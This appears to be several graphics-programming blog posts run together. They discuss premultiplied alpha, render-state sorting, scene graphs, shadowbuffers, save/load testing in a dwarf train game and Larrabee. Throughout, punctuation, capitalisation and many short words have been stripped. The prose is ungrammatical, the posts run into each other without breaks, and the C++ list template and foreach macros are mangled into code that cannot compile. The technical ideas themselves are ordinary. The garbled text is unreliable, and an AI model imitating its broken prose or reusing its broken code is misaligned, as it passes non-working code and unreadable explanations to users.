line new polynomial separately x x x x gather vertically power x get b c hey actually pretty elegant course want get perfcrazy gather term together sometimes really fine let compiler always danger fail finish derviationshttp case nt see one obviously elegant way express symbolically bit dodgy actually go evaluate end dividing zero unless precancel term allow sort shenanigan accidentally prove also failure point well obvious one divide calculating fail p value p value eg divide zero get infinity place pretty reasonable failure ca nt simple polynomial two different value input value also clear numerical instability two p value close polynomial going go pretty bonkers might actually go point want behaviour going go place seems pretty wellbehaved course mathematicallyinclined point simply product matrix multiplies start ab using kronecker delta fine point post course folk solve many harder problem well nt doubt point simple thing like hacker like nt go asking math god help solve applying basic problemsolving skill key knowing far math knowledge spread trick develop intuition know wellconstrained enough probably simple solution least explore towards solution without prematurely invoking posthighschool math intuition often wrong really simpleseeming problem indeed evil bastard need heavy numbercrunching case solution fast elegant could perform million time frame open sort interesting application whereas handed maple course get right answer would far slower failed would particularly obvious failed easy visualisation prove nt screw put excel spreadsheet play herepolynomial interpolationxlsx change value orange get result yellow look evaluation curve right think conventional alphablending basically wrong srcalpha invsrcalpha style blending fbrgb texelrgb texela fbrgb easy think alpha channel blend texel colour whatever computed colour come pixel shader know mean current content framebuffer logical intuitive also rubbish use instead premultiplied alpha dx parlance one invsrcalpha fbrgb texelrgb fbrgb thing happens alpha channel notice texel colour multiplied texel alpha seemingly trivial change actually pretty fundamental bunch reason go first mention course nt think new paper porter duff compositing digital imageshttp keithpcomkeithpporterduff twenty year later people still wrong thought try make world better place something anyway porter duff talk lot thing paper might want read whole thing right fundamental premultiplied alpha easy normal alphablending munges together two physically separate effect amount light layer rendering let behind amount light layer add image instead keep two related ca nt surface add bunch light scene without also masking behind physically make sense add bunch photon scene nt mean photon blocked premultiplied alpha fix keeping two concept separate blocking done alpha channel addition light done colour channel neat concept really useful practice better compression consider semitranslucent texture variety colour conventional blending colour texels irrelevant think hey get multiplied alpha rendered true consider bilinear filtering halfway rgba texels solid red transparent blue alpha value obviously interpolated colour also interpolated rather ugly shade purple rendered translucency colour texels important pulled filtering answer normal alphablending floodfill outwards texels nonzero alpha copy colour texels zero alpha pain write though course texels multiple neighbouring texels average something heuristic like go encode dxtn texture hit problem first encode texels ca nt encode colour black floodfilling pointless black going bleed actually seen shipping game edge translucent stuff bizarrely dark example get brightlylit green leaf rendered bright blue sky result blending bright dim halo around leaf silly developer ok nt useful alpha texture although toplevel mipmap might soon start make mipmap level need intermediate level let try problem first bleeding course fine write floodfiller whatever next problem come compress texture flood filler made sure neighbouring texels something like solid one different especially floodfiller blend dxtn compression badly number colour increase floodfiller added texel colour worse particular significant colour mostly invisible halo effect trying prevent hard tell dxtn compressor see bunch texels different colour try satisfy happens visually get significantly worse compression around translucent edge texture opaque middle counterintuitive ok mr smartypants answer well premultiplied alpha compress multiply colour channel alpha channel rendering change blend mode srcalpha invsrcalpha one invsrcalpha rocketscience happens texels black wait get bleeding halo nt let halftexel example let say entirely red texture bit alpha render onto green background expect get shade red green yellow darkest yellow around dark halo something like right solid red transparent red second one get premultiplied compression bilinear filter get render onto bright green fbrgb texelrgb fbrgb exactly expecting dark halo since colour want encode black exactly right thing lucky eh well really meant used premultiplied alpha even though doc nt say better still encode texture edge texels black whatever neighbour single colour encoder fit rather bunch general lead consistent compression quality translucent texture way directx two premultiplied alpha compressed texture format sure added rendered identically fact different format meant used metadata application using thing usually need far far metadata texture normal map alpha channel hold translucency specular map instead etc seems pointless look like going away good become become general avoid using seen early driver something strange used think actually trying multiply wanted stick sanity compositing translucent layer rendering technique want composite two translucent layer together render resulting image onto third common one seen used impostor take highpolygon object distance render texture long camera nt move much keep drawing texture billboard without rerendering object burning vertex pixel shader power visually small object rather complex fundamental point render texture image rendering screen problem come object multiple translucent texture might overlap effect looking standard render background translucent translucent problem actually rendering intermediate rendering onto background let math assuming normal alphablending want render render try emulate impostoring render render well er question alpha channel add mutiply render impostor fb find whatever blend mode choose basically get mess use premultiplied alpha everywhere doddle want render render actually render impostor start render render impostor fb scarylooking bit look horrendous actually reduces nice simple final result exactly want yay see premultipliedalphablending associative ie b c b c alphablend operation incredibly useful sort image compositing operation multipass lighting technique common thing rendering render object multiple time per light mean shadowing thing like stencil volume shadow deal single light per pas problem come translucent texture still want shadowed math nt work want texrgb texa pas texrgb texa pas texrgb texa texrgb texa texrgb texa oh dear mess let try using additive blending second pas instead use opaque object texrgb texrgb texrgb texa texrgb texa closer still right ok let try premultiplied alpha want texrgb pas texrgb pas us additive blending like opaque object texrgb texrgb texrgb texrgb magic actually make perfect sense think pas ask much light one let much light add realise actually three pass first one occludes background amount second add third add combine first two using one invsrcalpha blending op additive blended alpha single operation place game want lerp material standard alphablending one occlude background extent add colour extent example smoke particle system like place want additive blend without occluding background example fire particle system two common blending mode usually called add lerp somesuch want material bit want single particle system additive flame particle turning sooty lerping particle age ca nt change renderstate middle particle system silly help u premultiplied alpha man thank god course using premultiplied alpha happens set alpha value without changing rgb value normal lerp blending get fully translucent surface effect fb premultiplied alpha er oh additive blending blimey neat trick particle change additive lerp get older change alpha value texture colour firey redyellow colour towards alpha dark sooty colour renderstate change needed nice smooth transition trick work mesh texture want glow opaque stuff one example neon sign actual tube thing like support bracket whatever opaque faked bloom effect tube additive single pas anyway yeah premultiplied alpha use love pas maybe take another year til everyone stuff correctly long time ago wrote post premultiplied alpha right way blending worth reread go look summary pma two important thing make texture filtering mipmapping work correct even texture alpha channel avoids blackpurple edge make alphablending associative blend b blend c blend b blend c important properly many modern engine especially working particle system impostor rendering variety deferred rendering arguable actually property expressed different way term implemented hardware still two different bit chip worth considering separately fact opposite end pipeline one texture filtering alphablending actually interesting property fact bunch place overall gamedev assettopixels production pipeline think either traditional lerp blending using pma extent mix match convert one lot style blending course notably additive blending pma combine lerp additive blending single operation see post detail put aside moment complicates particular discussion converting lerp pma pretty simple multiply rgb channel alpha channel converting way harder since need divide rgb channel alpha obviously two bad thing happen first alpha could zero case new rgb value undefined would nt problem actual use lerp blending zero unless want filter rgb neighbour case matter exactly problem filtering nonpma data mentioned problem new rgb value bigger problem want store limitedprecision buffer happens data expressing blend nt lerp like additive operation case unsurprising problem expressing lerp reason let say pma lerp conversion full problem consider lerp pma conversion area production rendering pipeline consider following texture authoring paint package export via various process final shipping image disk card streamed internet whatever texture stored memory loaded disk runtime sampled filtered gpu texture unit math inside shader pipeline alphablend unit blend shaded pixel rendertarget buffer current pipeline turn annoying difficult author data directly pma format paint package nt really understand many artist tough time getting head around generally uphill struggle practice phase almost always result lerpblended format data many development studio convert pma format almost immediately internal toolchain everything stage onwards pma fantastic way thing give advantage pma good filtering good compression flexible rendering architecture everything consistent never get confused whether dealing lerp pma data recommended way thing however case possible disk image might pma obvious case whatever reason nt conversion step middle common example usergenerated content user supply texture import straight engine need keep track image format pma lerp sometimes simple naming format convention example maybe dd file pma assetprocessing pipeline tgas lerp come straight paint package reason artist skip preprocessing step development get texture directly art package screen quickly possible good thing either way load file may need convert pma loading still keep rest pipeline onwards fully pma still good mean pipeline still pma file loader need know lerp blending fine anything dealing file format generally pretty messy anyway texture might pma case wo nt work either sean barrett raised problem tweet started recent discussion texture alpha channel using alpha blending using alpha test instead presumably value case nice clean cutout look full texture colour right edge alphatest happens also want texture filtering get round curve alphatest edge rather pixellated look pma preprocessing turn texels edge filtered inwards turning edge black least darker reason automatically pma texture alpha channel represents concept blending something else course place modern engine pack lot arbitrary data four channel known rgba xyzw nothing colour position direction case still slightly surprising alpha test similar concept blending another case happen came across back texture image alphablending data case would used blending others would used without converting pma would broken nonblended case since blended area would darkened black note first advantage pma format texture nt get weird edge texture filtered nt matter source art already specifically authored make sure pixel still contain sensible data alphablending turned one solution dualmode problem would create two copy texture one converted pma used blending case left alone used blending could even store alpha channel since used duplication waste texture memory complicates assethandling system two copy texture around alternative storing lerp format flag warns also complexity far simpler thing deal reason stage pure pma texture pma format others lerp format even still keep stage pure pma form changing shaders little sampling lerpform texture convert pma form simply multiplying rgb alpha value using shader code three multiplies really cheap even mobile hardware nt big deal rest shader math done assuming pma data may include compositing texture texture pma lerp long also convert appropriately sampling obviously complication need multiplies depending source texture type mean significant growth number shaders many engine already deal combinatorial explosion reason anyway one option include system note lost nice filtering property pma texture folk authoring need remember old rule edge mipmaps last two stage maybe funky math shader require lerp data ca nt really think example never say never even obvious rgb multiply could done shader still preserve alphablend stage pma form still retain nice associativity property meaning mix match shaders scene worry using pma blending even adding final multiply cause problem maybe shader combination change alphablend mode cope reminder pma blending performs operation four channel sometimes called one invsrcalpha blending xrgba rendertarget x shader x rendertarget x important note specified blending happens alpha channel well otherwise lose associativity property framebuffer alpha result important used later blend framebuffer onto thing pma shader nt want multiply rgb alpha sends alphablend unit pma blending could get alphablend unit u need change blending equation xrgb rendertarget x shader x shader rendertarget x xa rendertarget x shader x rendertarget x note alpha channel nt change important us srcalpha invsrcalpha blending rgb channel word standard lerp blending retains pma blending alpha channel us littleknown feature graphic card usually called separate alpha blending may littleknown around long time required card basically ubiquitous desktop set true set appropriately specify rgb alpha blend separately specify rgb alpha blend separately opengl depending version use glextblendfuncseparate modern glblendfuncseparate lot option adopting pma filtering blending way adopt bit bit satisfy traditional part authoring pipeline even case actually nt want force entire pipeline pma time exception rather default modern engine really using pma standard least giving option right thing remove many annoying problem translucency thirty year since porter duff paper let get job done properly bit circuitry video card read framebuffer ram put digital analogue convertor feed monitor ramdac see old day vga card cable standard pretty much video card memory thing output monitor people still use term ramdac refer chip output dvi even though nt actually dac digital analogue convertor r feed handy case accidentally post something useful total newb interweb tech r fascinating appears least five different version apart one called atom nt different version completely different thing altogether cue airplane gag open standard oxymoron precisely open standard mean standard could nt change would nt open truly open standard one invented nobody know yet open standard rfc forest slashdot post anyone file submarine patent hmmm impressed automagic r feed generator tiddlywikis probably lot cunning way tweak embedded command rtfm problem every time touch page get put top even minor tweak eg adding tag corrcting typo adding tiddler directly part blog also description field nt much description entire text entry sure intent field might try hand bit add blog bit format nt exactly rocketscience template tell set really verbose automatic one handdone one blog headline choose like best way r feed page web address xml instead html firefox automagically give little orange icon click look like lot thing nt added manual link left hand side still problem r feed yell big rsser nt really know standard practice stuff like tweak get right forget news think r good idea waiting decent implementation two way make manuallyedited feed complete text wiki stuff edited ca nt use wiki link kinda whole point using wiki continue make like singleline description post decent r reader include link full post click oneline teaser intrigue using r bet bet bet bet bet bet even easier added email address menu left http wwwradgametoolscom used work joining intel rad product include binkhttp enwikipediaorgwikibinkvideo mile pixomatic thing worked two year deano calver neat article comparing raytracing rasterisation http basically agree raytracing limited number thing good large number thing bad bunch thing people think good raytracing applied either system argument always people scalability well two method scale amount content rise put simplistic way raytracing take pixel traverse database see object hit pixel whereas rasterisation take database traverse screen see pixel object hit theory sound inner outer loop swapped pixel v object right problem rasterisation simple way checking every single pixel object eg bounding box object triangle rasterisation algorithm know shape triangle raytracing also bunch way checking every object pixel method simple win take time reconstruct scene change fundamental problem thing inner loop changing one pixel next pretty easy rasteriser pixel pretty simple thing laid nice regular grid rasteriser keep around lot information pixel pixel raytracer hand stepping object scene inherently nicely ordered state object say nothing state object logically want object outer loop pixel inner loop absurdly simplistic way looking thing course handy n notation way thinking start digging find lot reason one slightly efficient rest bubblesorts quicker mergesorts small list architecture high branch penalty still work hard overcome bigo problem course real world show lot harsh reality put aside massive dominance hardware rasterisers somewhat localminimisation problem hardware company know build rasterisers nt know build raytracers build therefore people program offline rendering world hardware generalpurpose cpu dominant mechanism still rasteriser form reyes system standard rasteriser course long way graphic card currently nevertheless fundamental principle hold object see pixel hit way round raytracing place future possible neither rasterising currently neither great solution lighting problem ignacio castaño recently looked explicit ordering method regular grid http kinda neat see algorithmhttp wwweelpigotdnsorgpapersfastvertcacheopthtml really well considering cachesizeblind quite sure weakness writing observe large regular grid would get bit degenerate start long doublewide strip real game mesh section regular grid eg chunk small enough algorithm quickly hit discontinuity kick doublewide mode hilbertlike mode thought removing think algorithm biggest weakness first triangle nt data cache basically making random choice theory run algorithm half mesh done throw first tris back available pool run end fun thing originally wrote algorithm needed okish nt need good real priority fast spaceefficient running part export pipeline maxmaya sort halfdecent ordering better essentially random ordering getting nice accident turned really good extra day work someone pointed kurt pelzer article game programming gem called combined depth idbased shadow buffer nt book stupid ca nt check really magic algorithm except realisation combine two fairly obvious probably much technique reinvented somebody else wheel stupid sorry kurt renderstate change cost valuable clock cycle cpu gpu good idea sort rendering order leastcost need careful know leastcost mean number setrenderstate call send note going suggest number section number purely hypothetical realistic deliberately avoided making hardware know illustration typically graphic hardware driven bunch internal bit control fixedfunction unit flow overall pipeline mapping bit renderstates exposed graphic api far obvious example various alphablend state look simple api large wideranging implication hardware pipeline depending set various type early hierarchical late z enabled disabled general difficult predict render state affect pipeline written graphic driver excellent knowledge graphic hardware responsible right still hard time predicting change single renderstate underlying hardware add complexity lot modern hardware certain limited number rendering pipeline state sometimes called context slightly confusing manner flight complexity number change different point pipeline example hardware may able pixel shaders vertex shaders set vertex shader constant flight different set texture number purely illustration driver submits one number time pipeline stall note differing number category general pipeline change cheaper others value change rather functional change example changing alphablend state mentioned functional change enables disables different thing ordering operation pipeline change expensive changing eg fog colour functional change value change fog still register change value red blue functional change usually fairly cheap aware look like value change example zbias look like single value change cheap right change value zbias circuitry switched entirely maybe pipeline reconfigured go faster although look like value change functional change well mind general guide state change cost hardware ordered least changing vertex index constant buffer another one format simply changing pointer data start description content nt changed usually large pipeline change changing texture another texture identical every way format size number mipmaps etc except data held changing pointer start data changing anything pipeline note format requirement important hardware shader hardware filtering whereas fixedfunction ie fast hardware smaller obviously changing one requires new shaders uploaded changing constant eg shader constant fog color transform matrix etc everything value rather enum bool actually change pipeline note hardware shader constant cheap change hardware quite expensive phase change happened shader constant moved core general memory everything else shaders z state blend state etc tend cause widescale disruption rendering pipeline unit get enabled disabled fast path turned big change aware much cost difference change note changing render target even expensive really state change major disruption pipeline first foremost order render target ok hardware cost software cost well certainly cost actually making renderstate change call usually pretty small function call storing dword array try optimise least number setrenderstate call spend cpu power sorting save minimising number call total false economy also note actual work state change nt happen setrenderstate happens next time draw call driver look whole state vector decides hardware change accordingly caled lazy state change every driver day think minicompile stage driver look api specification pipeline compiles hardware description case literally compile shaders changed way accommodate state change minicompile obviously expensive best driver cache state previous frame nt full thinking every time course still actually send new pipeline card stall card many context flight see tends happen cpu side state cause new pipeline tend higher list state nt tend lower much lower difference cost top bottom note although supersecretproject software renderer still certain cost state change cost reflected data exactly coincidence software renderer hardware renderers similar profile sort thing consolation nt hard limit general cost changing renderstates much lower hardware course also good idea sort fronttoback opaque object reconciled sorting state way sort renderstates hierarchically four level according four item generally assign byte hash per list item concatenate byte form lucky accident four item nt plan way also note hash computed mesh creation time nt go around making hash runtime bunch hashed renderstates order put generally assume first two type state change changing constant buffer texture pointer much cheaper others also nt tend change shader without changing shader constant texture anyway reasonable approximation make subbuckets object share state last two item subbucket pick closest object camera sort subbuckets according distance closest first draw order within bucket draw object renderstate whatever order happen care getting object one state together get fair bit earlyz rejection without spamming hardware many expensive change theory sorting within subbucket could get slightly better driverhardware efficiency suspect effort sorting expensive saving get measured experience talking mean time test hunch let know intuition wide mark would nt first time note obviously first nearest object putting object subbins later sorting stage bunch obvious implementation efficiency use bucketsort z rather trying high precision although sound complex surprisingly difficult explain text implementation actually fairly simple runtime cost low stl fine like sort thing get trying actual implementation drive wall unbelievably hard debug anything compile error runtime error performance still use stl something complex nt want write map hash table pretty handy want frikkin autoresizing array want use perfsensitive code using vanilla stl drive nut year like every decent coder planet reinvented particular brand wheel going claim best wheel ever even best wheel could make ended decade really take time fix fighting really frikkin shut use consider point continuum use abuse least nt already one turing sake use stop hurting stl vector hideously overspecced simple thing boringly obvious included completeness thing particularly like explicit ordered unordered function item removal ideal world specialize make orderedunordered nature list declaration function use twice much code maintain thanks ask inheritance andor nested template would probably solve cost sanity debug version foreach loop best catch common bug like adding removing value inside loop iterators seen happily work time every resize happen point free memory punch face well addremove operation idea since unfortunately common bug seem code time really like addition help punch face pun everything better pun code steal appropriate arbitrarysized list template class hold ordered data function also unordered version speed template class class arbitrarylist careful changing need agree arbitrarylistgrannytypedef int ireservedsize current reserved size list int isize current size list pt list public optional initial size setting void init int iinitialsize int iinitialreservedsize pt null isize ireservedsize iinitialreservedsize iinitialsize reserveto iinitialreservedsize true sizeto iinitialsize false else iinitialsize sizeto iinitialsize true true void fini pt null assert ireservedsize assert isize else assert ireservedsize assert isize delete pt ireservedsize isize pt null constructor optional initial size setting arbitrarylist int iinitialsize init iinitialsize destructor arbitrarylist void fini return pointer given item item const int iitem assert iitem isize return pt iitem const constitem const int iitem const assert null assert iitem isize return pt iitem use operator operator const int iitem return item iitem const operator const int iitem const return constitem iitem return pointer first item ptr void return pt return size list int size void const return isize return pointer last item plus one sense stl end ptrend void return pt isize grows shrink list number item preserve existing item item fall end shrink may vanish return pointer first item set bbinatzero false nt want memory freed even though size speed thing list frequently used even though zeroed us set ballocexactly true want ireservedsize exactly isize sizeto int inum bool bbinatzero true bool ballocexactly false assert inum int ioldsize isize isize inum inum ireservedsize already exactly right space well ireservedsize assert pt null else assert pt null return pt else inum ireservedsize enough space inum bbinatzero shrunk bin memory delete pt pt null ireservedsize return null ballocexactly inum ireservedsize nt need resize return pt got need resize array way either assert inum int inewsize inum ballocexactly usually grow needed avoid constant regrows inewsize inum inewsize inewsize assert inewsize ireservedsize pt null assert ireservedsize pt new inewsize else assert ireservedsize poldt pt pt new inewsize int icopysize ioldsize icopysize inewsize icopysize inewsize int icopysize pt poldt delete poldt assert pt null ireservedsize inewsize return pt preallocates least big void reserveto int inum bool ballocexactly false assert inum isize inum ireservedsize return int ioldsize isize sizeto inum false ballocexactly isize ioldsize free array memory fancy way saying sizeto void freemem void sizeto true remove given item number copying last item position shrinking list looking old removeitem function new name void removeitemunord int iitemnumber assert iitemnumber assert iitemnumber isize pt iitemnumber pt sizeto isize remove given item number shuffling item shrinking list void removeitemord int iitemnumber assert iitemnumber assert iitemnumber isize const int istoppoint int iitemnumber istoppoint pt pt sizeto isize add one item list return pointer new item additem void sizeto isize return pt add supplied item list void additem const additem insert item specified place list shuffle everything one return pointer item insertitem int position assert position position isize sizeto isize int isize position pt pt return pt position insert item specified place list shuffle everything one void insertitem int position insertitem position copy specified data list void copyfrom int ifirstitem const p int inumitems isize ifirstitem inumitems sizeto ifirstitem inumitems int inumitems item ifirstitem p copy another arbitrary list type void copyfrom int ifirstitem const arbitrarylist int ifirstotheritem int inumitems inumitems inumitems othersize ifirstotheritem isize ifirstitem inumitems sizeto ifirstitem inumitems assert othersize ifirstotheritem inumitems int inumitems item ifirstitem otherconstitem ifirstotheritem copy another list always add new item end current list void addfrom arbitrarylist int ifirstotheritem int inumitems inumitems inumitems othersize ifirstotheritem int ifirstitem isize sizeto ifirstitem inumitems copyfrom ifirstitem ifirstotheritem inumitems simple find return list position found int finditem const int isize pt return return reallocates memory capacity exactly size useful list constructed remain size long time void shrinktofit sizeto isize true true copy constructor arbitrarylist const arbitrarylist int inumitems othersize pt null isize ireservedsize sizeto inumitems int inumitems item otheritem see foreach except special version called get coat ifndef debug define forsytheach list listptr last listptrend last easier syntax listsofvalues nt mind copying define forsytheachval ref list listptr last listptrend ref last last ref easier syntax listsofpointerstoobjects define forsytheachptr ref list listptr last listptrend ref last null last ref else ifndef debug debug version try selfcheck nt modify list middle loop cause reallocate everything fails horribly case need loop numitems thingsize inside loop explicitly thing pthing thing thingnum define forsytheach list listptr first listptr last listptrend internalfunctionalassert firstlistptr internalfunctionalassert lastlistptrend last easier syntax listsofvalues nt mind copying define forsytheachval ref list listptr first listptr last listptrend ref last internalfunctionalassert firstlistptr internalfunctionalassert lastlistptrend last ref easier syntax listsofpointerstoobjects define forsytheachptr ref list listptr first listptr last listptrend ref last null internalfunctionalassert firstlistptr internalfunctionalassert lastlistptrend last ref endif range name mindboggling sse maybe like extra lowfrequency channel glad instruction set replaced something sensible although finally add ternary instruction multiplyadd finally finished fairly tedious necessary part dwarf minecart tycoon save load two part well duh load save game simple course real question barely game wait end project everything stable answer ability snapshot restore game give bunch really useful ability make life simpler developing game course extra hassle keeping saveload system date change still think worth effort easier testing need test pathfinding ability dwarf complex sequence bridge door need complexity map create map scratch time going skimp hope algo work know nt test nt work whereas saveload create map reload time testing debugging stresstesting dwarf good pathfinding variety complex environment periodically check still work expected environment change made recently fix one bug nt break lot thing indeed complete rewrite system need still behaves well fifteen different environment savegames reasonably sure nt miss major feature rewrite taken extreme testdriven development idea criterion good code pas test pass test still nt work situation well nt enough test quite radical interesting principle bear mind principle scale well large team complex codebases easy debugging big one complex game like bug hide apparent many minute actually happened example bug manifest two different dwarf walking mine section rock theory allow one bug happened decided walk sort marker arbitration make sure second one get task actually manifest second one get find rock dig sitting debugger know happened actual bug happened ten second hundred game turn earlier good luck forensics way solved similar problem startopia work fine well every second autosave game use rotation filename last save around get gnarly bug like always find earlier savegame bug happens watch respective dwarf make incorrect decision key component course repeatability load earlier savegame nt happen dwarf rolled rng differently go different bit rock never find bug important make sure game deterministic repeatable got another blog post boil deterministic gameplay thing nt deterministic right player although dwarf follow existing queued command directive recording playing back new command issue difficult might future style game thing therefore bug happen autonomously still catch bug obvious way save load write routine traverse whole world writing every object data structure disk pain arse need figure turn pointer file need object index offset start file something like also need least versionnumber everything almost certainly want change data structure develop game still keep ability load older version save file keeping code load old file around really tedious get grubby pretty fast cunning plan since used mr happen know granny bunch routine boring work really well good granny still load mesh anim etc file created first release granny version back versioning matching field name field move problem new field added initializes default zero null field vanish ignores pointer fixup save directly inmemory structure structure load ready use handle bit transition also endian change good thing routine designed work nongranny data format define use data like yeah know sound like advert useful anyway added grannydatatypedefinition thingies structure granny read writes quite simple still thing granny store canonical definition base type eg train type called fast red train stats power acceleration sprite use etc train type reference granny happily save structure load back nt want create new base type meant hardcoded game need go train type see one type map whatever current game hardcoded fast red train even slightly different stats course name nt exist choose map way closest similar stats somesuch probably biggest hassle enums lot enums game peep type object type train type order type block type etc etc etc certainly want add list sometimes change list maybe even rearrange ordering save file stored integer deal well neat hack charles bloomhttp cbloomrantsblogspotcom others create enum list enum string time normally intended printing name define trainstatexxyytable xx tsstuck yy xx tsgoing xx tswaiting xx tsstopped xx tslast define xx x x define yy enum trainstate trainstatexxyytable undef xx undef yy define xx x x define yy const char trainstatename trainstatexxyytable undef xx undef yy thing like printf movement type trainstatename train movement enums post wrangling enums also make part savegame state point array string granny save array string load savegame structure granny table string loaded compare two table strcmp match fine nt construct old new mapping table remap obviously old enum removed need write code deal common probably cleanest thing write conversion code convert old save game loading saving delete code biggest annoyance granny loading routine actually positive feature normal circumstance granny load file using one big allocation good thing reducing fragmentation file mesh animation something like usually manipulated game loaded problem case world part world need mutable separately allocated separately freed ca nt free memory middle big allocation cause nasty problem solution copyworld routine createworld destroyworld say tin copy world loading process load granny world file get granny version convert needed check enum string array changed convert inobject enums remap base type eg point loaded fast red train global fast red train copyworld loaded granny one create new one made lot allocation destroyworld currently running world free world single block memory granny loaded switch world loaded saving opposite copy current world new one clear cached data point saving bloating file point savegame state enum string arays get saved get granny write file destroyworld copied version wait need copy world first two reason kinda minor first want nuke cached data granny nt save pointer fixup maybe real game wo nt appreciate second copy could fork savegame stuff separate thread granny conversion disk access cause thread stall wo nt much effect gameplay speed actually kinda cool mean autosaves time without nasty stutter yeah important copyworld routine want use sucker everywhere ok admit actually destroyworld like calling may fire ready sure work oh yes well aware one problem normal saveload code nt get called much nt get tested much fix debug mode every single game turn call copyworld twice call stepgametime original first copy compare two make sure call destroyworld two copy make second copy well comparison fails step second copy watch change copy agree screwed copyworld routine three disagree probably dependency global somewhere eg rng forgot move world dependency traversal order somesuch fast game run quarter speed function well enough every minute test saveload obvious thing save first copy destroy first copy step original world load first copy step compare mismatch screwed saveload routine run savedestroyloadcompare happens every frame exactly quick though slow think timestep every half second debug mode window file caching seems work pretty well left game running day little dwarf train running around queued order building delivering etc seems pretty robust conclusion lot rather tedious work actually horrible hard debug could using granny routine make moderately easy maintain change structure glad easier debugging autosaves deterministic gameplay give already evil bug like fix thinking hard hate thinking hard never really trust result maybe fixed maybe changed initial condition enough avoid time rather watch actually happen debugger know exactly fix replay watch happen second time scene graphhttp enwikipediaorgwikiscenegraph essentially method rendering place entire world big graph tree information needed render point renderer renderer traverse graph draw item often edge node attempt describe sort minimal state change idea fairly simple computer scientist use fancy data structure tree graph really cool structure great sort thing surely going good rendering right great theory sadly completely wrong world big tree coffee mug desk child desk sibling mug child house parent coffee contains anything mug sits bolted nothing putting entire world big tree obvious thing far real world concerned going total luddite claim tree useful graphic course load tree graph structure place bsp tree portal graph skeletal animation tree spatial octrees partitioning mesh group fit memory bonerelated otherwise group mesh lit particular light list object use shadertexturepostprocessing effectrendertargetshadowbufferetc ton hierarchical nodeedge structure place point ton mean different thing important bit nt match try put one big graph get complete bloody mess list mesh use shadowbuffer x completely unrelated list mesh use skeleton seen many scene graph year typically bunch elegant accessors traverser gigantic list unholy hack loophole workarounds suchlike people add get even simplest demo try put big real complex game graph everything linked everything either root node fifty bazillion direct child big flat array bunch highly specialised link child link structure mentioned hard access traverse clutter everything fundamentally course resolve traversal order somehow object need rendering sort mostlyoptimal way never going get ordering traversing single treegraph according rule fundamentally complex involves far tradeoff traverse front back get earlyz rejection traverse shadowbuffer save switching rendertargets traverse surface type save switching shaders traverse skeleton keep animation cache nice warm change according situation game type pay u graphic coder big buck make judgement call ca nt escape problem fundamental trying fit one ubergraph seems like madness compounded fact scene graph implicitly retained mode paradigm immediate mode paradigm esteemed friend casey muratorihttps mollyrocketcomforums uncomplimentary comment thing retained mode concept inclined agree yes work sometimes necessary eg physic engine choose given alternative one major argument hear presented scene graph minimal state change concept idea edge node mesh rendered hold sort indication number cost state change going one node organising traversal well achieve sort nearminimal number state change problem almost completely bogus reasoning three reason typically graphicscard driver try take entire state rendering pipeline optimise like crazy sort compilation step way changing single line c produce radically different code might think changing alphatestenable flag actually change huge chunk pipeline oh sir waferthin renderstate http enwikipediaorgwikimrcreosote practice extremely hard predict anything relative cost various change beyond extremely broad generality even change fairly substantially generation generation number state change make rendering call relevant used true era far le day basically irrelevant card treat unique set state indivisible unit often upload entire pipeline state incremental state change main exception rendertarget odd nonobvious one like zcompare mode platform like pc often idea sort card user running even id card ten twenty possible graphic card architecture sucession different driver one optimise try make edgetraversal function change according card installed sound expensive remembering game limited cpu gpu added asymmetry load anyway something argue til cow come home wanted give tuppenorth prevailing wisdom using scene graph saying nt good reason using one writing fair number engine fair number game yet find reason particularly compelling invented lot cool stuff plenty continue ignore perilpremultiplied alpha purely artifact time thwacked head dumped shallow grave stake heart wolfgang engel eric haines managed get book made free downloadable pdfshttp wrote three article included tip trick nice live net also like convert html done previous article put website much easier search pdfs honestly busy thing larrabee may time work energy quick selfreview possibly order displacement mapping oh dear lot talking almost content tom talk state industry article unfortunately industry still nt figured displacement mapping immensely frustrating still stuck chickenandegg solve three difficult problem get progress partial defence content first article using vertex shaders geometry compression dean calver realised early article would overlap since dean shader code ready go talked talked tool think two part larger article aside moaning hardware nt displacement mapping still nt think main goodness article displacement compression think still interesting technique detail algorithm paperhttp wwweelpigotdnsorgpaperspapershtml dean show good shader code sadly muckyfoot dissolved able battletest pipeline described article never know elegantly would worked practice always wanted bolt system export pipeline nt natural fit still think excellent way render highpolygon image without waiting larrabee change world shader abstraction always difficult talk engine design article without gigantic ream code think one successful effort always hard sure lot concept expanded upon others later shaderx book subeditor engine design section probably one part article nt seen discussed elsewhere texture compositing system used production pipeline prototype blade ii extensively following project worked well biggest benefit artist could use file directory structure liked could copy rename texture store format liked made life much simpler nt need constantly worry bloating disk memory space time bake asset together disk duplication removed hashing fiddly stuff like format conversion packing specular map alpha channel happened automatically discussing game devs know others invented similar system never seen anybody write post process fun effect buffer result trying figure structure engine usual opaque alphablended stuff add lot structure top standard pipeline one sense happy turned far complex originally hoped lot structure dynamic allocation rendertargets object callback feel like overkill couple cheesy postprocessing effect hand complexity make thing pleasingly elegant still unproven whether extra complexity play well fullblown game rendering engine rather simple demo still think interesting idea lot fun though tiring first day two talk first shadowbuffers yes know say gdc would nt complete without giving yet another talk shadowbuffers ca nt fight tradition anyway one figured combine id depth shadowbuffers get best world surface acne peter pan problem additionally robust nt fall according size world distance light object scene constant problem depthonly shadowbuffers nice bonus need bit id bit depth need shadowbuffer work pretty much every hardware certainly everything shaders register combiners including gamecube could probably even get work tried hard enough think problem marked solved combined multi frustum partitioning still expensive like work think hardedged shadow also solved problem make edge nice soft plenty method running still clear winner lot people researching though think nt long talk half hour brief look way integrate lot complex shaders pipeline people moving simple shaders previous gen hardware full combinatorial craziness today hardware lot method work shaders nt scale get talk explores method used past throwing large number shaders multiple platform certainly meant gospel many way skin cat decent start bewildered option talk papershttp wwweelpigotdnsorgpaperspapershtml page shadowbuffer one also demo let know trouble running nt much testing machine good get talk way early could focus day two stuff supersecretproject relax radgametools boothbabe rest show need sleep kinda silly question keep coming answer either add space desired thing depends ask prefer shadowbuffer word buffer implies certain dynamic quality framebuffers zbuffers singleframe entity dynamically updated hardware like shadowthingies hand vertex index constant buffer generally nt universal quality shadowmaps much like texture map indeed sampled texture hardware mapping visible frame however tend think shadowmaps reverse lightmaps calculated offline dynamically generated taken together prefer shadowbuffer rest world well fault wrong information google say shadowbuffer hit shadow buffer hit shadowmap hit shadow map hit know phew exhausting first siggraph right public eye met lot smart people got introduced lot prominent academic fun able meet people reading paper serious amount larrabuzz around siggraph lot intel people swamped question unfortunately allowed answer yet vague topic apologize tough remembering information yet public added restriction length talk siggraph four talk larrabee totalling minute much information pack time main paper larrabee manycore architecture visual computing available acm favourite search engine presented larry seiler tuesday outlined hardware architecture reasoning behind choice made designing extremely exciting see official siggraph paper surviving whole rigorous process peerreview rebuttal gratifying know 